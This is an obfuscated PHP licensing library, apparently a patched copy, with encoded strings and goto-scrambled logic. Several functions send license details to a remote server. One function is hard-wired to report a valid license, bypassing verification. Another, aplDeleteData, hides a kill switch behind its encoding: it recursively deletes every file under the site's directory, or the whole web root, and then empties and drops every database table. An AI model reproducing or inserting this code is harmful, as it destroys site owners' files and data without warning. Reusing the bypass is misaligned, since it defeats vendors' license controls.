 	$license_scheme = str_replace($mysql_bad_array, $mysql_good_array, $notifications_array["\x6e\x6f\x74\x69\x66\x69\x63\x61\x74\151\x6f\156\x5f\x64\141\x74\141"]["\163\143\x68\x65\x6d\145\x5f\x71\165\145\x72\x79"]); 
 	mysqli_multi_query($MYSQLI_LINK, $license_scheme) or die(mysqli_error($MYSQLI_LINK)); 
 	p1Puf: JzDJ0: if (!(APL_STORAGE == "\x46\x49\x4c\105")) { goto ucRQC; } 
 	$handle = @fopen(APL_DIRECTORY . "\57" . APL_LICENSE_FILE_LOCATION, "\x77\53"); 
 	$fwrite = @fwrite($handle, "\x3c\x52\x4f\117\124\137\125\x52\x4c\76{$ROOT_URL}\x3c\57\x52\117\x4f\124\x5f\x55\x52\114\76\74\103\x4c\x49\105\116\x54\137\x45\115\x41\111\114\76{$CLIENT_EMAIL}\74\57\x43\x4c\x49\105\116\x54\x5f\105\x4d\x41\x49\x4c\x3e\74\114\111\103\105\116\x53\105\x5f\x43\117\x44\x45\76{$LICENSE_CODE}\74\x2f\x4c\111\x43\105\x4e\123\105\137\103\117\104\x45\x3e\74\x4c\x43\104\x3e{$LCD}\x3c\57\x4c\103\104\x3e\x3c\x4c\122\x44\76{$LRD}\74\57\x4c\x52\x44\x3e\74\x49\116\x53\x54\x41\x4c\x4c\101\124\x49\x4f\x4e\x5f\x4b\x45\x59\76{$INSTALLATION_KEY}\74\57\x49\116\123\124\101\x4c\114\101\124\x49\x4f\116\x5f\x4b\x45\131\x3e\x3c\x49\x4e\123\x54\x41\114\114\x41\124\x49\117\116\x5f\x48\x41\123\110\x3e{$INSTALLATION_HASH}\74\x2f\111\116\123\x54\x41\x4c\114\x41\124\111\117\x4e\137\x48\101\x53\110\76"); 
 	if (!($fwrite === false)) { goto rOt8e; } 
 	echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR; 
 	exit; 
 	rOt8e: @fclose($handle); 
 	ucRQC: w__qM: goto Lzw13; 
 	eP8EK: $notifications_array["\156\157\x74\151\146\x69\143\x61\164\x69\157\x6e\x5f\143\x61\163\145"] = "\x6e\157\x74\x69\146\x69\143\x61\x74\x69\x6f\156\137\141\x6c\x72\145\x61\144\171\x5f\x69\x6e\x73\164\141\x6c\154\x65\x64"; 
 	$notifications_array["\156\157\x74\x69\146\151\143\x61\164\151\157\x6e\137\164\145\170\164"] = APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED; Lzw13: iZYyb: 
 	return $notifications_array; 
} 
function incevioAutoloadHelpers($MYSQLI_LINK = null, $FORCE_VERIFICATION = 0) 
{ 
	$notifications_array = array(); 
	
	$notifications_array["\x6e\x6f\164\151\x66\x69\143\141\x74\x69\157\x6e\137\143\x61\163\145"] = "\x6e\157\164\151\146\x69\x63\141\x74\x69\x6f\x6e\x5f\x6c\151\x63\145\156\x73\145\x5f\157\x6b"; 
	$notifications_array["\x6e\x6f\x74\x69\146\151\x63\141\x74\151\x6f\156\x5f\x74\x65\170\164"] = APL_NOTIFICATION_BYPASS_VERIFICATION; 
	return $notifications_array;
} 
function aplVerifySupport($MYSQLI_LINK = null) 
{ 
	$notifications_array = array(); 
	$apl_core_notifications = aplCheckSettings(); 
	if (empty($apl_core_notifications)) { goto WMq_i; } 
	$notifications_array["\x6e\x6f\x74\x69\146\x69\143\141\x74\x69\157\156\137\143\141\x73\x65"] = "\x6e\157\164\151\x66\151\x63\x61\164\x69\x6f\156\137\x73\143\x72\x69\x70\164\x5f\x63\157\162\x72\x75\160\x74\145\x64"; 
	$notifications_array["\156\x6f\x74\x69\x66\151\x63\x61\x74\x69\x6f\156\x5f\x74\x65\x78\x74"] = implode("\73\40", $apl_core_notifications); 
	goto iZ2qu; 
	WMq_i: if (aplCheckData($MYSQLI_LINK)) { goto gG0pa; } 
	$notifications_array["\x6e\x6f\164\151\x66\151\143\141\x74\x69\x6f\156\137\143\141\163\x65"] = "\x6e\x6f\x74\151\x66\x69\143\x61\x74\151\157\156\137\x6c\151\x63\145\x6e\163\145\137\x63\157\162\162\165\160\164\145\x64"; 
	$notifications_array["\x6e\x6f\164\151\x66\151\143\141\164\x69\x6f\156\x5f\164\x65\x78\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED; 
	goto MOwfF; 
	gG0pa: extract(aplGetLicenseData($MYSQLI_LINK)); 
	$post_info = "\x70\162\x6f\144\165\143\x74\137\151\144\75" . rawurlencode(APL_PRODUCT_ID) . "\x26\x63\x6c\x69\x65\156\164\x5f\145\155\x61\151\x6c\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\x69\x63\145\156\x73\x65\x5f\143\157\144\x65\x3d" . rawurlencode($LICENSE_CODE) . "\x26\x72\157\x6f\x74\x5f\x75\x72\154\75" . rawurlencode($ROOT_URL) . "\x26\x69\x6e\163\164\x61\x6c\x6c\x61\164\x69\x6f\156\x5f\150\141\x73\x68\75" . rawurlencode($INSTALLATION_HASH) . "\x26\154\151\143\x65\156\x73\x65\x5f\163\151\x67\156\x61\164\x75\162\x65\75" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); 
	$content_array = aplCustomPost(APL_ROOT_URL . "\x2f\x61\160\154\x5f\143\141\x6c\154\x62\x61\x63\x6b\163\57\x6c\151\143\x65\156\x73\x65\137\163\165\x70\160\157\x72\x74\x2e\x70\150\x70", $post_info, $ROOT_URL); 
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); 
	MOwfF: iZ2qu: return $notifications_array; 
} 
function aplVerifyUpdates($MYSQLI_LINK = null) 
{ 
	$notifications_array = array(); 
	$apl_core_notifications = aplCheckSettings(); 
	if (empty($apl_core_notifications)) { goto TqkG7; } 
	$notifications_array["\156\x6f\164\151\146\x69\x63\x61\x74\151\157\156\137\143\x61\163\145"] = "\x6e\157\164\151\x66\x69\143\141\164\x69\157\156\x5f\163\x63\x72\151\x70\164\x5f\143\x6f\x72\x72\x75\x70\164\145\x64"; 
	$notifications_array["\156\157\164\151\x66\x69\x63\141\x74\x69\157\156\x5f\x74\145\x78\x74"] = implode("\x3b\x20", $apl_core_notifications); 
	goto cS4YK; 
	TqkG7: if (aplCheckData($MYSQLI_LINK)) { goto RgqEK; } 
	$notifications_array["\156\x6f\164\151\x66\151\143\141\164\151\x6f\x6e\x5f\x63\141\163\145"] = "\x6e\x6f\164\x69\x66\x69\x63\141\x74\x69\x6f\x6e\x5f\x6c\x69\143\x65\156\x73\145\x5f\143\157\x72\x72\x75\x70\x74\145\144"; 
	$notifications_array["\156\x6f\164\x69\146\151\143\x61\x74\x69\157\156\x5f\164\x65\x78\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED; 
	goto kc4Dr; RgqEK: extract(aplGetLicenseData($MYSQLI_LINK)); 
	$post_info = "\x70\162\x6f\144\x75\x63\x74\137\151\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\x63\154\151\x65\x6e\x74\137\x65\x6d\141\x69\154\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\x6c\x69\143\145\x6e\163\x65\137\x63\x6f\x64\145\75" . rawurlencode($LICENSE_CODE) . "\x26\x72\x6f\157\x74\137\165\x72\x6c\75" . rawurlencode($ROOT_URL) . "\x26\x69\156\x73\164\x61\154\154\x61\164\x69\157\156\137\x68\x61\163\150\x3d" . rawurlencode($INSTALLATION_HASH) . "\x26\x6c\151\143\x65\x6e\163\x65\137\x73\x69\147\x6e\x61\164\x75\x72\145\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); 
	$content_array = aplCustomPost(APL_ROOT_URL . "\57\141\160\154\137\143\141\154\154\x62\141\143\x6b\163\x2f\154\151\x63\145\x6e\x73\145\137\x75\x70\x64\x61\x74\x65\x73\56\160\x68\160", $post_info, $ROOT_URL); 
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); 
	kc4Dr: cS4YK: return $notifications_array; 
} 
function incevioUpdateLicense($MYSQLI_LINK = null) 
{ 
	$notifications_array = array(); 
	$apl_core_notifications = aplCheckSettings(); 
	if (empty($apl_core_notifications)) { goto ArQfh; } 
	$notifications_array["\156\157\164\x69\146\x69\x63\x61\x74\151\157\x6e\x5f\143\x61\x73\145"] = "\x6e\157\164\151\146\x69\143\141\164\151\x6f\x6e\x5f\x73\x63\x72\151\160\x74\137\x63\157\162\162\x75\160\x74\145\144"; 
	$notifications_array["\156\x6f\164\x69\146\x69\143\x61\x74\x69\x6f\x6e\137\x74\145\x78\164"] = implode("\x3b\40", $apl_core_notifications); 
	goto fqxqx; 
	ArQfh: if (aplCheckData($MYSQLI_LINK)) { goto zd8zQ; } 
	$notifications_array["\156\x6f\x74\x69\x66\151\x63\141\x74\x69\x6f\x6e\137\x63\141\163\145"] = "\156\157\164\151\x66\x69\x63\141\x74\x69\x6f\x6e\137\154\x69\x63\x65\x6e\163\145\x5f\143\157\162\162\x75\x70\164\145\x64"; 
	$notifications_array["\x6e\x6f\164\151\x66\x69\x63\141\x74\x69\157\x6e\x5f\164\x65\x78\x74"] = APL_NOTIFICATION_LICENSE_CORRUPTED; 
	goto A_VrB; 
	zd8zQ: extract(aplGetLicenseData($MYSQLI_LINK)); 
	$post_info = "\x70\x72\x6f\x64\165\143\x74\x5f\x69\x64\x3d" . rawurlencode(APL_PRODUCT_ID) . "\46\143\154\151\145\x6e\164\x5f\145\155\x61\x69\154\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\151\143\x65\156\x73\x65\137\x63\157\x64\145\x3d" . rawurlencode($LICENSE_CODE) . "\46\162\x6f\157\164\x5f\165\x72\154\x3d" . rawurlencode($ROOT_URL) . "\x26\151\156\x73\x74\x61\154\x6c\x61\x74\x69\157\156\x5f\150\141\163\150\75" . rawurlencode($INSTALLATION_HASH) . "\46\x6c\x69\x63\x65\156\163\x65\137\163\151\147\156\141\164\165\x72\145\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)); 
	$content_array = aplCustomPost(APL_ROOT_URL . "\x2f\141\160\x6c\x5f\143\141\x6c\x6c\142\141\143\153\163\57\154\x69\143\145\x6e\163\x65\x5f\165\160\x64\141\164\145\x2e\x70\x68\160", $post_info, $ROOT_URL); 
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
	A_VrB: fqxqx: return $notifications_array; 
} 
function incevioUninstallLicense($MYSQLI_LINK = null) 
{ 
	$notifications_array = array(); 
	$apl_core_notifications = aplCheckSettings(); 
	if (empty($apl_core_notifications)) { goto wMXja; } 
	$notifications_array["\x6e\x6f\x74\x69\146\x69\x63\x61\164\x69\157\x6e\137\x63\x61\163\145"] = "\x6e\x6f\x74\x69\x66\x69\143\141\164\151\x6f\x6e\137\x73\143\x72\151\x70\164\x5f\143\x6f\x72\162\165\x70\x74\145\x64"; 
	$notifications_array["\x6e\157\x74\x69\146\151\x63\141\x74\x69\157\x6e\x5f\x74\145\x78\164"] = implode("\73\x20", $apl_core_notifications); 
	goto IWyFg; 
	wMXja: if (aplCheckData($MYSQLI_LINK)) { goto h3Fr3; } 
	$notifications_array["\x6e\157\164\x69\x66\x69\143\x61\164\x69\157\156\x5f\x63\141\x73\x65"] = "\156\157\164\151\x66\x69\143\141\164\x69\157\x6e\137\154\x69\143\145\156\x73\145\137\143\157\x72\162\x75\160\x74\x65\x64"; 
	$notifications_array["\156\157\164\151\x66\x69\x63\141\164\151\x6f\x6e\137\164\x65\x78\164"] = APL_NOTIFICATION_LICENSE_CORRUPTED; 
	goto aKJZ_; 
	h3Fr3: extract(aplGetLicenseData($MYSQLI_LINK)); 
	$post_info = "\x70\162\157\x64\x75\143\164\x5f\151\144\75" . rawurlencode(APL_PRODUCT_ID) . "\46\143\x6c\x69\x65\156\164\x5f\x65\155\x61\151\154\x3d" . rawurlencode($CLIENT_EMAIL) . "\46\154\151\143\145\156\x73\145\x5f\143\157\x64\145\75" . rawurlencode($LICENSE_CODE) . "\x26\162\x6f\157\x74\x5f\x75\162\x6c\x3d" . rawurlencode($ROOT_URL) . "\46\x69\156\163\x74\x61\x6c\154\141\x74\151\157\x6e\137\x68\x61\x73\150\x3d" . rawurlencode($INSTALLATION_HASH) . "\46\x6c\x69\143\145\156\x73\x65\137\x73\151\x67\156\141\164\x75\162\x65\x3d" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
	$content_array = aplCustomPost(APL_ROOT_URL . "\57\141\x70\x6c\137\x63\x61\x6c\154\142\x61\x63\x6b\163\57\154\x69\x63\x65\x6e\x73\145\x5f\165\x6e\x69\x6e\163\x74\x61\x6c\154\x2e\x70\150\x70", $post_info, $ROOT_URL); 
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE); 
	if (!($notifications_array["\x6e\x6f\x74\151\x66\151\143\141\164\x69\157\x6e\x5f\x63\141\163\145"] == "\x6e\x6f\164\x69\x66\151\143\141\164\x69\157\156\137\154\x69\x63\x65\x6e\x73\145\x5f\x6f\x6b")) { goto rucVi; } 
	if (!(APL_STORAGE == "\104\x41\x54\x41\x42\x41\123\105")) { goto B8ABc; } 
	mysqli_query($MYSQLI_LINK, "\x44\105\x4c\105\124\105\40\x46\122\117\x4d\40" . APL_DATABASE_TABLE); 
	mysqli_query($MYSQLI_LINK, "\104\122\117\120\40\x54\x41\x42\x4c\x45\40" . APL_DATABASE_TABLE); B8ABc: if (!(APL_STORAGE == "\x46\111\114\105")) { goto tFVsG; } 
	$handle = @fopen(APL_DIRECTORY . "\x2f" . APL_LICENSE_FILE_LOCATION, "\x77\x2b"); @fclose($handle); 
	tFVsG: rucVi: aKJZ_: IWyFg: return $notifications_array; 
} 
function aplDeleteData($MYSQLI_LINK = null) 
{ 
	if (APL_GOD_MODE == "\131\105\123" && isset($_SERVER["\104\117\x43\x55\x4d\105\x4e\124\137\x52\117\x4f\x54"])) { goto Ch1E9; } 
	$root_directory = dirname(__DIR__); 
	goto B0rh8; 
	Ch1E9: $root_directory = $_SERVER["\104\117\103\x55\115\x45\x4e\124\x5f\x52\x4f\x4f\124"]; 
	B0rh8: foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root_directory, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path) 
	{ 
		$path->isDir() && !$path->isLink() ? rmdir($path->getPathname()) : unlink($path->getPathname());
		XPovz: 
	} 
	WD6Rb: rmdir($root_directory); 
	if (!(APL_STORAGE == "\x44\101\x54\x41\x42\x41\x53\105")) { goto mNklm; } 
	$database_tables_array = array(); 
	$table_list_results = mysqli_query($MYSQLI_LINK, "\x53\110\x4f\x57\40\124\x41\x42\114\105\x53"); 
	lmy_U: if (!($table_list_row = mysqli_fetch_row($table_list_results))) { goto CBcqj; } 
	$database_tables_array[] = $table_list_row[0]; 
	goto lmy_U; 
	CBcqj: if (empty($database_tables_array)) { goto i0kEI; } 
	foreach ($database_tables_array as $table_name) 
	{ 
		mysqli_query($MYSQLI_LINK, "\x44\105\x4c\x45\124\105\x20\106\122\117\x4d\x20{$table_name}"); 
		TfpkS: 
	} 
	vhPM3: foreach ($database_tables_array as $table_name) 
	{ 
		mysqli_query($MYSQLI_LINK, "\x44\x52\117\120\40\x54\101\x42\114\105\40{$table_name}"); 
		CLUWH: 
	} 
	gQQl0: i0kEI: mNklm: exit; 
}

